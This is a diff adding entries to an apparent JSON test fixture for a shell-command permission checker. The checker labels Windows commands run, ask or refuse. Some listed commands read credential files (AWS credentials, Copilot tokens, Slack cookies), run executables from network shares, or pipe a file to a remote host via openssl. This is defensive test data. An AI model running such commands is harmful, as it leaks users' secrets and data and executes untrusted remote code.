@@ -2633,6 +2633,134 @@
    "rules": [
     "secret.env"
    ]
+  },
+  {
+   "cmd": "git add --pathspec-from-file=C:\\Users\\ana\\.aws\\credentials",
+   "verdict": "ask",
+   "classes": [
+    "secret"
+   ],
+   "rules": [
+    "path.secret"
+   ]
+  },
+  {
+   "cmd": "gcc -o C:\\Users\\ana\\AppData\\Local\\ember\\x.exe x.c",
+   "verdict": "refuse"
+  },
+  {
+   "cmd": "dir \\\\fileserver\\share",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ],
+   "rules": [
+    "net.unc"
+   ]
+  },
+  {
+   "cmd": "type \\\\fileserver\\share\\x.txt",
+   "verdict": "ask",
+   "rules": [
+    "net.unc"
+   ]
+  },
+  {
+   "cmd": "pushd \\\\fileserver\\share",
+   "verdict": "ask",
+   "rules": [
+    "net.unc"
+   ]
+  },
+  {
+   "cmd": "\\\\fileserver\\share\\x.exe",
+   "verdict": "ask",
+   "classes": [
+    "escape"
+   ],
+   "rules": [
+    "escape.run-remote"
+   ]
+  },
+  {
+   "cmd": "\\\\fileserver\\share\\x.bat",
+   "verdict": "ask",
+   "rules": [
+    "escape.run-remote"
+   ]
+  },
+  {
+   "cmd": "cmd /c \\\\fileserver\\share\\x.exe",
+   "verdict": "ask",
+   "rules": [
+    "escape.run-remote"
+   ]
+  },
+  {
+   "cmd": "net use Z: \\\\fileserver\\share",
+   "verdict": "ask",
+   "rules": [
+    "net.unc"
+   ]
+  },
+  {
+   "cmd": "net use",
+   "verdict": "run"
+  },
+  {
+   "cmd": "type %LOCALAPPDATA%\\github-copilot\\hosts.json",
+   "verdict": "ask",
+   "classes": [
+    "secret"
+   ],
+   "rules": [
+    "path.secret"
+   ]
+  },
+  {
+   "cmd": "type %APPDATA%\\Slack\\Cookies",
+   "verdict": "ask",
+   "classes": [
+    "secret"
+   ],
+   "rules": [
+    "path.secret"
+   ]
+  },
+  {
+   "cmd": "openssl s_client -connect example.com:443 < data.txt",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ],
+   "rules": [
+    "send.nc"
+   ]
+  },
+  {
+   "cmd": "php -S 0.0.0.0:8000",
+   "verdict": "ask",
+   "rules": [
+    "net.listen"
+   ]
+  },
+  {
+   "cmd": "php -S localhost:8000",
+   "verdict": "run"
+  },
+  {
+   "cmd": "net view \\\\example",
+   "verdict": "ask",
+   "classes": [
+    "publish"
+   ],
+   "rules": [
+    "net.unc"
+   ]
+  },
+  {
+   "cmd": "net view",
+   "verdict": "run"
   }
  ]
 }
